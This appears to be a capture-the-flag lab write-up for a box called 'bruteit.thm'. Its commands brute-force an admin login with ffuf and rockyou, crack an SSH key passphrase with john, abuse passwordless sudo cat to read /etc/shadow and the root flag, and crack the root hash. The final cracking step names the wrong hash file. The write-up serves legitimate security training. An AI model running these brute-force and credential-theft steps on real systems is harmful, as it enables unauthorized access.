# Accessing the admin port
At `http://bruteit.thm/admin` <-- Added to /etc/hosts

Bruteforce the login page with
```bash
ffuf -u http://10.130.149.125/admin/ -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "user=admin&pass=PASS" \
-w /usr/share/wordlists/rockyou.txt:PASS -c -fs 733
```

Login as admin and save johns RSA hash

# ssh login as john
Convert john rsa to a format john can understand with
```bash
ssh2john ./johnRSA > JohnRSA-hash.txt
```
Run john to obtain Johns passphrase
```bash
john ./JohnRSA-hash.txt
```
Login as John via ssh (chmod 600 on johnRSA first)
```bash
ssh -i ./johnRSA john@bruteit.thm
```

# Root
run
```bash
sudo -l
```
To list all privileged commands we have, and its /bin/cat with no passwd

```bash
sudo cat /etc/shadow | grep root &&
printf '\n\nROOT FLAG' &&
sudo cat /root/root.txt
```
Save the root users hash to a file, (hash type sha512-crypt, info with hashid ./rootHash.txt)

Obtain the root users password with
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ./johnRSAkey-hash.txt
```

